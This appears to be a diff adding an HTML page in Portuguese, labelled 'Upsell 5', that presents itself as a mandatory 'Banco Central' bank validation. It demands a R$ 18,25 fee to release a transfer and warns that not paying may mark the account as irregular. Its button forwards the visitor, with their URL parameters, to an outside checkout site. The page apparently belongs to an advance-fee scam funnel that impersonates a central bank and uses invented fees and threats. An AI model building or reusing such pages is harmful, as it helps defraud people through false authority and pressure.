@@ -1,0 +1,156 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Upsell 5 - Validação Bancária</title>
+   
+    <script>
+        localStorage.setItem("upsell", "up5");
+        </script>
+   
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f8f9fa;
+            color: #333;
+        }
+
+        .header {
+            background-color: #004080;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .header img {
+            max-width: 150px;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 40px auto;
+            padding: 30px;
+            background: #ffffff;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            text-align: center;
+        }
+
+        .container h1 {
+            color: #004080;
+            font-size: 26px;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+
+        .container p {
+            font-size: 16px;
+            color: #555;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .highlight {
+            color: #004080;
+            font-weight: bold;
+        }
+
+        .cta {
+            margin-top: 30px;
+        }
+
+        .cta button {
+            background-color: #004080;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .cta button:hover {
+            background-color: #0056b3;
+        }
+
+        .footer {
+            margin-top: 30px;
+            font-size: 14px;
+            color: #777;
+        }
+
+        .footer strong {
+            color: #d9534f;
+        }
+
+        .info-box {
+            background-color: #f1f1f1;
+            border-left: 5px solid #004080;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: left;
+            font-size: 15px;
+            color: #333;
+        }
+
+        .info-box h3 {
+            margin: 0;
+            font-size: 16px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <img src="https://s3.typebot.io/public/workspaces/clpwrgv88001vlh0fl3wduaqz/typebots/clsoykmoc0001o1a8fuuy3j8r/blocks/ymggz8eopp0fj524hfxubuit?v=1735166818525" alt="Logo Banco Central">
+    </div>
+
+    <div class="container">
+        <h1>🔒 Validação Bancária Obrigatória</h1>
+        <p>Para garantir a segurança e regularidade da sua transferência, é necessária a realização de uma <span class="highlight">validação bancária obrigatória</span>, conforme as normas do sistema bancário nacional.</p>
+
+        <div class="info-box">
+            <h3>Por que a validação é necessária?</h3>
+            <p>✔️ Evita transações inválidas ou bloqueios futuros.</p>
+            <p>✔️ Confirma a autenticidade dos seus dados bancários.</p>
+            <p>✔️ Libera sua transferência com total segurança.</p>
+        </div>
+
+        <p><strong>Valor da Taxa:</strong> <span class="highlight">R$ 18,25</span></p>
+        <p><strong>Prazo para Validação:</strong> Até 15 minutos após o pagamento.</p>
+
+        <div class="cta">
+            <button onclick="checkout(event)">VALIDAR AGORA</button>
+        </div>
+
+        <div class="footer">
+            ⚠️ <strong>Atenção:</strong> O não pagamento pode causar o registro de sua conta como <strong>irregular</strong>, impactando futuras transações financeiras.
+        </div>
+    </div>
+    <script>
+        function checkout(event) {
+          event.preventDefault();
+      
+          // Captura todos os parâmetros da URL atual
+          const currentParams = window.location.search;
+      
+          // Constrói a URL de destino incluindo os mesmos parâmetros
+          const destino = "https://pay.novopagamentooseguro.com/checkout/d7bebdab-107a-4ce9-ba72-93e602c0523f" + currentParams;
+      
+          // Redireciona
+          window.location.href = destino;
+        }
+      </script>
+
+</body></html>
